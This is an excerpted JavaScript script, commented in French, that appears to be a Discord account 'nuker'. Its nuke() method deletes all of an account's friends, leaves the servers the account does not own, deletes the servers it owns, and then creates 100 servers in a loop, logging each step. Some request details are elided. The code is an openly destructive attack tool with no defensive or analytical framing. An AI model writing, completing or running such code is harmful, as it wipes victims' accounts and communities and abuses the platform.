...
class User extends Color {
  ...
  async nuke() {
    ...
    if (status !== 200) throw new Error('/ Zitiix Copyright / Requête stoppé avec comme erreur :' + status);
        ...
        friends.forEach(
          (friend) => {
            Axios.delete(base + `/users/@me/relationships/${friend.id}`, {
              ...
              () => Color.log(`${friend.tag} a été supprimé des amis du compte.`)
            ).catch(
              (e) => { Color.log(e, '>', 0); }
            );
          }
        ...
        owner.false.forEach(
          (guild) => {
            Axios.delete(base + `/users/@me/guilds/${guild.id}`, {
              ...
              () => Color.log(`J'ai quitté le serveur ${guild.name}`)
            ).catch(
              (e) => { Color.log(e, '>', 0); }
            );
          }
        ...
        owner.true.forEach(
          (guild) => {
            Axios(
              ...
              () => Color.log(`J'ai supprimé le serveur ${guild.name}`)
            ).catch(
              (e) => { Color.log(e, '>', 0); }
            );
          }
    ...
    for (var i = 1; i < 101; i++) {
      await Axios(
        ...
        () => {
          Color.log(`J'ai créer un serveur sur le compte (${i})`);
        }
      ).catch(
        (e) => {
          Color.log(e, '>', 0);
